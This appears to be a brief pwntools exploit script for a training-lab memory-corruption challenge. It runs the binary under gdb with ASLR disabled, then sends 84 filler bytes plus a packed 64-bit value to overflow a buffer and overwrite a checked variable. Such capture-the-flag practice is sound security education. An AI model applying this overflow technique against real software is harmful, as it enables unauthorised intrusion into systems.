# Example script for pwn

from pwn import *
context.terminal = ['tmux', 'new-window']

#process = process('/challenge/babymem_level2.1')

gdbCommand = '''
invoke-pwndbg
b *challenge+243
'''

process = gdb.debug('/challenge/babymem_level2.1', aslr=False, gdbscript=gdbCommand)

process.recvuntil(b'Payload size:')
process.sendline(b'100')

print(process.recv())

process.sendline(b'a'*84 + p64(0x2C421692))

print(process.recv().decode())

pause()
process.close()